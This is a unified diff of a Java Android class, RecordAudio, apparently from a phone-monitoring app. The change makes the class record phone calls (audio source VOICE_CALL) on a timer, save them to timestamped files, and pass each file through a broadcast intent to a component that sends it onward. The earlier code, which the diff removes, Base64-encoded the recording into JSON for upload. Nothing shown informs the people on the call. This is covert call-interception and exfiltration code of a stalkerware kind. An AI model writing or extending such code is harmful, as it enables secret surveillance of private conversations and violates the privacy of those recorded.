@@ -6,16 +6,12 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
-import org.apache.commons.io.FileUtils;
-import org.json.JSONException;
-import org.json.JSONObject;
-
 import android.content.Context;
+import android.content.Intent;
 import android.media.MediaRecorder;
-import android.os.Build;
 import android.os.Environment;
-import android.util.Base64;
 
+import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
@@ -28,90 +24,69 @@ import com.inet.android.utils.Logging;
  */
 public final class RecordAudio {
 
-	private static final int RECORDING_BITRATE = 44100;
-	private static final int RECORDING_BITRATE_OLD = 8000;
-
 	private MediaRecorder mMediaRecorder;
-	private final String TAG = "RecordAudio";
 	private String time;
 	private static final String mPathName = "data";
-	private static final String recordTypeStr = "22";
+	private static String FILE_REQUEST = "com.inet.android.media.FILE";
+	private static final int ID_ACTION_SEND = 1;
 
 	// Thread pool
 	private ExecutorService mThreadPool;
-	int minute;
-	private AtomicBoolean mIsPlaying = new AtomicBoolean(false);
+	private int minute = -1;
 	private AtomicBoolean mIsRecording = new AtomicBoolean(false);
 	private String outputFileName;
-	private String LOG_TAG = "RecordAudio";
+	private String LOG_TAG = RecordAudio.class.getSimpleName().toString();
 	private static Context mContext;
 
 	public RecordAudio(Context context, int minute) {
-		Logging.doLog(TAG, " RecordAudio", " RecordAudio");
+		Logging.doLog(LOG_TAG, " RecordAudio", " RecordAudio");
 		mThreadPool = Executors.newCachedThreadPool();
-		this.minute = minute * 30;
+		this.minute = minute * 60;
+		RecordAudio.mContext = context;
+	}
+
+	public RecordAudio(Context context) {
+		Logging.doLog(LOG_TAG, " RecordAudio", " RecordAudio");
+		mThreadPool = Executors.newCachedThreadPool();
 		RecordAudio.mContext = context;
 	}
 
 	// --------create Record and start recording---------------
 	private void createRecord(String fileName) {
 		// reset any previous paused position
-		String format = ".aac";
 		// initialise MediaRecorder
 		if (mMediaRecorder == null) {
 			mMediaRecorder = new MediaRecorder();
-			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
 
-			if (Build.VERSION.SDK_INT >= 16) {
+			Logging.doLog(LOG_TAG, "Build.VERSION.SDK_INT >= 16");
 
-				Logging.doLog(TAG, "Build.VERSION.SDK_INT >= 16");
+			mMediaRecorder
+					.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+			mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+			mMediaRecorder.setAudioEncodingBitRate(16);
+			mMediaRecorder.setAudioSamplingRate(44100);
 
-				mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-				mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-				mMediaRecorder.setAudioEncodingBitRate(16);
-				mMediaRecorder.setAudioSamplingRate(44100);
-				 
-
-			} else if (Build.VERSION.SDK_INT >= 10
-					|| Build.VERSION.SDK_INT < 16) {
-
-				Logging.doLog(TAG, "Build.VERSION.SDK_INT >= 10");
-
-				mMediaRecorder
-						.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-				mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-				mMediaRecorder.setAudioSamplingRate(RECORDING_BITRATE);
-				mMediaRecorder.setAudioEncodingBitRate(48);
-
-			} else {
-				mMediaRecorder
-						.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
-				mMediaRecorder
-						.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-				mMediaRecorder
-						.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-				mMediaRecorder.setAudioSamplingRate(RECORDING_BITRATE_OLD);
-				mMediaRecorder.setAudioEncodingBitRate(8);
-
-			}
 			mMediaRecorder.setOnErrorListener(new RecorderErrorListener());
 		} else {
 			mMediaRecorder.stop();
 			mMediaRecorder.reset();
 		}
 
-		mMediaRecorder.setOutputFile(fileName + format);
+		mMediaRecorder.setOutputFile(fileName);
 		try {
 			mMediaRecorder.prepare();
 			mMediaRecorder.start();
+			Logging.doLog(LOG_TAG,
+					"mMediaRecorder.start()", "mMediaRecorder.start()");
 		} catch (IllegalStateException e) {
-			Logging.doLog(TAG,
+			Logging.doLog(LOG_TAG,
 					"IllegalStateException thrown while trying to record a greeting");
 			e.printStackTrace();
 			mMediaRecorder.release();
 			mMediaRecorder = null;
 		} catch (IOException e) {
-			Logging.doLog(TAG,
+			Logging.doLog(LOG_TAG,
 					"IOException thrown while trying to record a greeting");
 			e.printStackTrace();
 			mMediaRecorder.release();
@@ -127,31 +102,33 @@ public final class RecordAudio {
 			public void run() {
 				outputFileName = getOutputFileName();
 				if (outputFileName != null) {
-					Logging.doLog(TAG, "record", "record");
-					mIsPlaying.set(false);
+					Logging.doLog(LOG_TAG, "executeRecording",
+							"executeRecording");
 					createRecord(outputFileName);
 					mIsRecording.set(true);
 					// launch tehe counter
-					Logging.doLog(TAG, "mThreadPool.execute",
+					Logging.doLog(LOG_TAG, "mThreadPool.execute",
 							"mThreadPool.execute");
-
-					mThreadPool.execute(new RecordingCounterUpdater());
+					if (minute != -1) {
+						Logging.doLog(LOG_TAG, "minute != -1" + minute,
+								"minute != -1" + minute);
+						mThreadPool.execute(new RecordingCounterUpdater());
+					}
 				}
 			}
 		});
 	}
 
 	// --------stop recording and call sendAudio----------------
-	private void executeStopRecording() {
+	public void executeStopRecording() {
 		mThreadPool.execute(new Runnable() {
-
 			@Override
 			public void run() {
 				if (mMediaRecorder != null) {
 					stopRecording();
 					mIsRecording.set(false);
-					if (outputFileName == null)
-						SendAudio(outputFileName);
+					if (outputFileName != null)
+						sendAudio(outputFileName);
 					outputFileName = null;
 				}
 
@@ -174,16 +151,15 @@ public final class RecordAudio {
 			filePath.mkdirs();
 		}
 		time = ConvertDate.logTime();
-
-		String file = dir + "/" + time;
-		Logging.doLog(TAG, "file " + file, "file " + file);
+		String file = dir + "/" + time + ".aac";
+		Logging.doLog(LOG_TAG, "file " + file, "file " + file);
 		File audioFile = new File(file);
 		try {
 			if (!audioFile.exists()) {
 				audioFile.createNewFile();
 			}
 		} catch (IOException e) {
-			Logging.doLog(TAG, "Unable to create media file!");
+			Logging.doLog(LOG_TAG, "Unable to create media file!");
 			e.printStackTrace();
 		}
 
@@ -209,61 +185,40 @@ public final class RecordAudio {
 				}
 				currentCounter++;
 			}
-
 		}
-
 	}
 
 	/**
 	 * Posts current position in the voice file to the Handler.
 	 */
 	private void postCounterUpdateMessage(int currentPosition) {
-		Logging.doLog(TAG,
+		Logging.doLog(LOG_TAG,
+				String.format("posting counter update of:%d", currentPosition),
 				String.format("posting counter update of:%d", currentPosition));
 		if (currentPosition == minute) {
-			Logging.doLog(TAG, "equals = " + minute);
+			Logging.doLog(LOG_TAG, "equals = " + minute, "equals = " + minute);
 			executeStopRecording();
 		}
 	}
 
 	private void stopRecording() {
 		if (mMediaRecorder != null) {
-			Logging.doLog(TAG, "Stopping recording");
+			Logging.doLog(LOG_TAG, "Stopping recording", "Stopping recording");
 			mMediaRecorder.stop();
 			mMediaRecorder.release();
 			mMediaRecorder = null;
 		}
 	}
 
-	private String encodeFileToBase64Binary(String fileName) throws IOException {
-
-		File file = new File(fileName);
-		byte[] bytes = FileUtils.readFileToByteArray(file);
-		String encoded = Base64.encodeToString(bytes, 0);
-		return encoded;
-	}
-
-	private void SendAudio(String path) {
-		String sendJSONStr = null;
-		JSONObject object = new JSONObject();
-		try {
-			object.put("time", ConvertDate.logTime());
-			object.put("type", recordTypeStr);
-			object.put("duration", this.minute);
-			object.put("path", path);
-			object.put("record", encodeFileToBase64Binary(path));
-
-			// sendJSONStr = jsonObject.toString();
-			sendJSONStr = object.toString();
-		} catch (JSONException e) {
-			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
-		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-//		FileRequest audio = new FileRequest(mContext);
-//		audio.sendRequest(sendJSONStr); // добавить строку request
-
+	private void sendAudio(String path) {
+		Logging.doLog(LOG_TAG, "sendAudio", "sendAudio");
+		// if (!RequestList.getLastFile().equals(path)) {
+		RequestList.setLastFile(path);
+		Intent intent = new Intent(FILE_REQUEST);
+		intent.putExtra("type", ID_ACTION_SEND);
+		intent.putExtra("path", path);
+		mContext.sendBroadcast(intent);
+		// }
 	}
 
 	/**
@@ -284,14 +239,12 @@ public final class RecordAudio {
 			default:
 				whatDescription = Integer.toString(what);
 				break;
-
 			}
-
-			Logging.doLog(TAG, String.format(
+			Logging.doLog(LOG_TAG, String.format(
 					"MediaRecorder error occured: %s,%d", whatDescription,
-					extra));
+					extra), String.format("MediaRecorder error occured: %s,%d",
+					whatDescription, extra));
 		}
-
 	}
 
 }
